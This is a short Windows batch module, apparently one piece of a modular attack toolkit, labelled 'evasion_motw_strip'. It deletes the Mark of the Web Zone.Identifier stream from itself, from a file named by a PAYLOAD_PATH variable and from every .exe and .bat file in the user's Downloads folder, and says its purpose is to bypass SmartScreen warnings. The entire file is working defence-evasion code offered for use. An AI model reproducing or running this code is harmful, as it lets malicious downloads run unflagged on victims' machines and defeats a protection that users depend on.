REM provides: evasion_motw_strip
REM depends: (none)
REM description: Remove Mark of the Web Zone.Identifier to bypass SmartScreen warnings

REM Delete the Zone.Identifier ADS from the current script
echo. > "%~f0:Zone.Identifier" 2>nul

REM Also strip MOTW from any payload files in the working directory
if defined PAYLOAD_PATH (
    echo. > "%PAYLOAD_PATH%:Zone.Identifier" 2>nul
)

REM Strip from common download locations
for %%f in ("%USERPROFILE%\Downloads\*.exe" "%USERPROFILE%\Downloads\*.bat") do (
    echo. > "%%f:Zone.Identifier" 2>nul
)
